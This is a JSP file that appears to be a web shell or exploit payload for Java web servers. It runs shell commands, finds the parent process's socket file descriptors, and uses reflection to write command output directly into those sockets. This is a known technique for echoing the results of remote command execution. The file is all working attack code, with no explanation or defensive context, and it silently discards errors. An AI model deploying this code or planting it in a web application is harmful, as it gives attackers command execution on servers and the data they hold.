<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String command  = "ls -l /proc/$PPID/fd|grep socket:|awk '{print $9}'";

    java.util.List<String> list = new java.util.ArrayList<>();
    String[] cmd = new String[]{"/bin/sh", "-c", command };
    java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
    java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
    java.io.BufferedReader br = new java.io.BufferedReader(isr);

    String line;
    while ((line = br.readLine()) != null){
        list.add(line);
    }

    br.close();
    isr.close();
    in.close();

    java.lang.reflect.Constructor<java.io.FileDescriptor> c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
    c.setAccessible(true);

    for(String s : list){
        Integer integer = Integer.parseInt(s);

        try{
            cmd = new String[]{"/bin/sh", "-c", "ls -l" };
            in = Runtime.getRuntime().exec(cmd).getInputStream();
            isr  = new java.io.InputStreamReader(in);
            br = new java.io.BufferedReader(isr);

            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null){
                sb.append(line + "\n");
            }

            java.io.FileOutputStream os = new java.io.FileOutputStream(c.newInstance(integer));
            os.write(sb.toString().getBytes());

            br.close();
            isr.close();
            in.close();
        }catch(Exception e){
            //pass
        }
    }
%>
</body>
</html>
